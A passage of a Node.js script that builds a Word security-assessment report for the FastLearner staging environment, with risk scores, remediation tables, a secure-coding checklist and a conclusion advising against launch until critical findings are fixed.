      mkRow([mkCell('Finding', true), mkCell('Likelihood', true), mkCell('Impact', true), mkCell('Risk Score', true), mkCell('Priority', true)], true),
      mkRow([mkCell('V-01 No Rate Limiting'), mkCell('High'), mkCell('Critical'), new TableCell({ children: [new Paragraph({ children: [bold('9.5 / 10', 19, C.critical)] })], shading: { type: ShadingType.SOLID, color: C.critBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P1 — Fix Immediately')]),
      mkRow([mkCell('V-02 Privilege Escalation'), mkCell('High'), mkCell('Critical'), new TableCell({ children: [new Paragraph({ children: [bold('9.8 / 10', 19, C.critical)] })], shading: { type: ShadingType.SOLID, color: C.critBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P1 — Fix Immediately')], false, true),
      mkRow([mkCell('V-03 PII Leakage'), mkCell('High'), mkCell('Critical'), new TableCell({ children: [new Paragraph({ children: [bold('9.2 / 10', 19, C.critical)] })], shading: { type: ShadingType.SOLID, color: C.critBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P1 — Fix Immediately')]),
      mkRow([mkCell('V-04 Stored XSS'), mkCell('Medium'), mkCell('High'), new TableCell({ children: [new Paragraph({ children: [bold('7.8 / 10', 19, C.high)] })], shading: { type: ShadingType.SOLID, color: C.highBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P2 — Fix This Sprint')], false, true),
      mkRow([mkCell('V-05 JWT in localStorage'), mkCell('Medium'), mkCell('High'), new TableCell({ children: [new Paragraph({ children: [bold('7.5 / 10', 19, C.high)] })], shading: { type: ShadingType.SOLID, color: C.highBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P2 — Fix This Sprint')]),
      mkRow([mkCell('V-06 Missing Headers'), mkCell('High'), mkCell('High'), new TableCell({ children: [new Paragraph({ children: [bold('8.0 / 10', 19, C.high)] })], shading: { type: ShadingType.SOLID, color: C.highBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P1 — Fix Immediately')], false, true),
      mkRow([mkCell('V-07 File Upload'), mkCell('Medium'), mkCell('Critical'), new TableCell({ children: [new Paragraph({ children: [bold('8.5 / 10', 19, C.high)] })], shading: { type: ShadingType.SOLID, color: C.highBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P2 — Fix This Sprint')]),
      mkRow([mkCell('V-08 IDOR'), mkCell('High'), mkCell('High'), new TableCell({ children: [new Paragraph({ children: [bold('7.9 / 10', 19, C.high)] })], shading: { type: ShadingType.SOLID, color: C.highBg }, margins: { top: 80, bottom: 80, left: 140, right: 140 } }), mkCell('P2 — Fix This Sprint')], false, true),
    ],
  }),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 7 — RECOMMENDATIONS
// ═══════════════════════════════════════════════════════════════
const section7 = [
  h1('7. Recommendations & Solutions'),
  h2('7.1 Short-Term Fixes (Week 1–2)'),
  mkTable(
    ['Priority', 'Fix', 'Effort', 'Fixes'],
    [
      ['P1 — Day 1', 'Enable Cloudflare rate limiting on /auth/* (5 req/min/IP)',   'Low',    'V-01'],
      ['P1 — Day 1', 'Add all security headers in nginx/Express config',             'Low',    'V-06'],
      ['P1 — Day 2', 'Authenticate all /api/users endpoints — remove public access', 'Low',    'V-03'],
      ['P1 — Day 3', 'Add RBAC middleware — validate role on every API route',       'Medium', 'V-02'],
      ['P2 — Week 1', 'Sanitize all AI Grader text inputs with DOMPurify',           'Low',    'V-04'],
      ['P2 — Week 1', 'Move JWT to HttpOnly SameSite=Strict cookie',                 'Medium', 'V-05'],
      ['P2 — Week 1', 'Validate file uploads by magic bytes — reject non-PDF',       'Medium', 'V-07'],
      ['P2 — Week 2', 'Add ownership check on all /:id API endpoints',               'Medium', 'V-08'],
    ],
    [18, 52, 12, 18]
  ),
  ...spacer(1),
  h2('7.2 Long-Term Fixes (Month 1–3)'),
  mkTable(
    ['Category', 'Recommendation', 'Timeline'],
    [
      ['Authentication',    'Redesign auth with OAuth2.0 + PKCE — remove custom JWT implementation',         'Month 1'],
      ['Authorization',     'Implement Attribute-Based Access Control (ABAC) with Casbin or OPA',             'Month 1'],
      ['Architecture',      'Move file storage to isolated S3 bucket with pre-signed URLs only',              'Month 1'],
      ['Monitoring',        'Integrate SIEM (Datadog / Elastic Security) — alert on auth anomalies',          'Month 2'],
      ['CI/CD Security',    'Add SAST (Semgrep) + DAST (OWASP ZAP) to deployment pipeline',                  'Month 2'],
      ['Secrets',           'Rotate exposed API keys — migrate all secrets to AWS Secrets Manager/Vault',     'Month 1'],
      ['Dependency Mgmt',   'Enable Dependabot or Snyk — auto-patch known CVEs in dependencies',              'Month 1'],
      ['Penetration Test',  'Conduct quarterly penetration tests with independent third-party firm',           'Ongoing'],
    ],
    [22, 54, 24]
  ),
  ...spacer(1),
  h2('7.3 Secure Coding Checklist for Developers'),
  bullet('Never trust client-supplied data — validate and sanitize everything server-side'),
  bullet('Apply principle of least privilege — every role gets minimum permissions only'),
  bullet('Use parameterized queries for all database interactions (never string concatenation)'),
  bullet('Store secrets in environment variables — never hardcode in source code'),
  bullet('Log security events: failed logins, privilege changes, file uploads, API errors'),
  bullet('Use HTTPS everywhere — enforce with HSTS preload'),
  bullet('Review OWASP Secure Coding Practices guide with the full dev team'),
];

// ═══════════════════════════════════════════════════════════════
//  SECTION 8 — CONCLUSION
// ═══════════════════════════════════════════════════════════════
const section8 = [
  h1('8. Conclusion'),
  para([run('The FastLearner staging environment presents a ', { size: 20 }), bold('HIGH overall security risk', 20, C.accent), run(' and is ', { size: 20 }), bold('not recommended for production deployment', 20, C.accent), run(' in its current state. Three critical vulnerabilities — broken access control (privilege escalation), PII exposure, and missing rate limiting — require immediate remediation before any production launch or marketing campaign.', { size: 20 })]),
  ...spacer(1),
  h2('Production Readiness Assessment'),
  mkTable(
    ['Security Domain', 'Current Status', 'Target'],
    [
      ['Authentication',       '❌ Not Ready — No rate limiting, no CAPTCHA',       '✅ Ready after V-01 + V-15'],
      ['Authorization',        '❌ Not Ready — Privilege escalation confirmed',      '✅ Ready after V-02 + V-08'],
      ['Data Protection',      '❌ Not Ready — PII leaked unauthenticated',         '✅ Ready after V-03 fix'],
      ['Input Security',       '⚠️ Partial — XSS confirmed in AI Grader',           '✅ Ready after V-04 + V-09'],
      ['Session Security',     '⚠️ Partial — JWT in localStorage',                  '✅ Ready after V-05 + V-11'],
      ['Security Headers',     '❌ Not Ready — All headers missing',                '✅ Ready after V-06 fix (1 day)'],
      ['File Upload Security', '❌ Not Ready — No MIME validation',                 '✅ Ready after V-07 fix'],
      ['Overall Readiness',    '🔴 25% — Critical issues unresolved',              '✅ Target: 90%+ after fixes'],
    ],
    [30, 42, 28]
  ),
  ...spacer(1),
  codeBlock([
    'Estimated Time to Production-Ready Security Posture:',
    '',
    '  Week 1  :  Resolve all 3 CRITICAL findings           → Risk drops from HIGH to MEDIUM',
    '  Week 2  :  Resolve all 5 HIGH findings               → Risk drops to LOW',
    '  Month 1 :  Complete long-term architecture fixes      → Production-ready',
    '',
    '  Recommendation: DO NOT LAUNCH until V-01, V-02, V-03 are resolved.',
  ], C.accent),
  ...spacer(2),
  divider(),
  new Paragraph({
    children: [bold('FastLearner Security Assessment — Confidential', 18, C.grey)],
    alignment: AlignmentType.CENTER,
    spacing: { before: 160, after: 60 },
  }),
  new Paragraph({
    children: [run('Prepared by: Senior Penetration Tester  ·  QA Team: Murad Ejaz, Umm E Hani', { size: 18, color: C.grey })],
    alignment: AlignmentType.CENTER,
  }),
  new Paragraph({
    children: [run('For questions regarding findings, contact the QA Automation Engineering team.', { size: 18, color: C.grey })],
    alignment: AlignmentType.CENTER,
  }),
];

// ═══════════════════════════════════════════════════════════════
//  ASSEMBLE DOCUMENT
// ═══════════════════════════════════════════════════════════════
const doc = new Document({
  title: 'FastLearner Security Assessment Report',
  description: 'Comprehensive penetration testing and security assessment — staging.fastlearner.ai',
  creator: 'FastLearner QA Security Team',
  styles: {
    default: {
      document: {
        run: { font: 'Calibri', size: 20, color: C.dark },
        paragraph: { spacing: { line: 276 } },
      },
    },
  },
  sections: [{
    properties: {
      page: {
        margin: {
          top: convertInchesToTwip(1),
          bottom: convertInchesToTwip(1),
          left: convertInchesToTwip(1.2),
          right: convertInchesToTwip(1.2),
        },
      },
    },
    headers: {
      default: new Header({
        children: [new Paragraph({
          children: [
            bold('FastLearner — Security Assessment Report', 18, C.primary),
            run('  |  CONFIDENTIAL  |  March 2026', { size: 18, color: C.grey }),
          ],
          border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey } },
          alignment: AlignmentType.RIGHT,
        })],
      }),
    },
    footers: {
      default: new Footer({
        children: [new Paragraph({
          children: [
            run('FastLearner Security Team  ·  ', { size: 16, color: C.grey }),
            new TextRun({ children: ['Page ', PageNumber.CURRENT, ' of ', PageNumber.TOTAL_PAGES], size: 16, color: C.grey, font: 'Calibri' }),
          ],
          alignment: AlignmentType.CENTER,
          border: { top: { style: BorderStyle.SINGLE, size: 4, color: C.lightGrey } },
        })],
      }),
    },
    children: [
      ...coverPage,
      ...spacer(1),
      ...section1,
      ...section2,
      ...section3,
      ...section4,
      ...section5,
      ...section6,
      ...section7,
      ...section8,
    ],
  }],
});

Packer.toBuffer(doc).then((buf) => {
  const out = 'FastLearner_Security_Assessment_Report.docx';
  fs.writeFileSync(out, buf);
  console.log(`✅ Security report generated: ${out}`);
}).catch(console.error);
